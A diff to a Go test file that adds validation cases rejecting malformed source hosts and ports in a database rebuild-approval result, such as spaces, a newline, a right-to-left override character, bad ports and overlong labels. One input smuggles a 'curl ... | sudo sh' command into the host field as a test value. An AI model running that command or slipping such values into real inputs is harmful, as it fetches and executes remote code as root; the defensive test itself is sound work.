@@ -290,6 +290,20 @@ var unusableApprovals = map[string]proto.RebuildApprovalResult{
 	"request bad source": {Required: true, Code: "123456", Source: "sumber-aneh", RemainingSec: 1700},
 	"approved no source": {Required: true, Approved: true, Addr: "10.0.0.1", RemainingSec: 86000},
 	"approved bad addr":  {Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "bukan-ip", RemainingSec: 86000},
+	// A source host that is neither an IP address nor a host name, or a
+	// port out of range (P-3).
+	"source bracket form": {Required: true, Code: "123456", Source: "[jalankan: curl http://x/y | sudo sh]:3306", RemainingSec: 1700},
+	"source with spaces":  {Required: true, Code: "123456", Source: "db baru:3306", RemainingSec: 1700},
+	"source with newline": {Required: true, Code: "123456", Source: "db\nbaru:3306", RemainingSec: 1700},
+	"source with U+202E":  {Required: true, Code: "123456", Source: "db\u202ebaru:3306", RemainingSec: 1700},
+	"approved bracket form": {Required: true, Approved: true, Source: "[jalankan: curl http://x/y | sudo sh]:3306",
+		Addr: "10.0.0.1", RemainingSec: 86000},
+	"source port 0":      {Required: true, Code: "123456", Source: "db-baru:0", RemainingSec: 1700},
+	"source port 65536":  {Required: true, Code: "123456", Source: "db-baru:65536", RemainingSec: 1700},
+	"source long label":  {Required: true, Code: "123456", Source: strings.Repeat("a", 64) + ".lan:3306", RemainingSec: 1700},
+	"source long name":   {Required: true, Code: "123456", Source: strings.Repeat("abcdefghi.", 25) + "lann:3306", RemainingSec: 1700},
+	"source empty label": {Required: true, Code: "123456", Source: "db..lan:3306", RemainingSec: 1700},
+	"source underscore":  {Required: true, Code: "123456", Source: "db_baru:3306", RemainingSec: 1700},
 	// A field the answer's state does not use (P-1).
 	"not required with code":   {Code: hostileCode},
 	"not required with digits": {Code: "123456"},
@@ -406,6 +420,8 @@ func TestRebuildApprovalUsable(t *testing.T) {
 		{Required: true, Code: "012345", Source: "db-baru.lan:3306", RemainingSec: 1700},
 		{Required: true, Approved: true, Source: "[fd00::1]:3306", Addr: "fd00::1", RemainingSec: 86000, AgeSec: 60},
 		{Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "10.0.0.1"},
+		{Required: true, Code: "123456", Source: "DB-1.rs.example:65535", RemainingSec: 1700},
+		{Required: true, Code: "123456", Source: strings.Repeat("a", 63) + ".lan:1", RemainingSec: 1700},
 	} {
 		if !RebuildApprovalUsable(res) {
 			t.Errorf("%+v not usable", res)
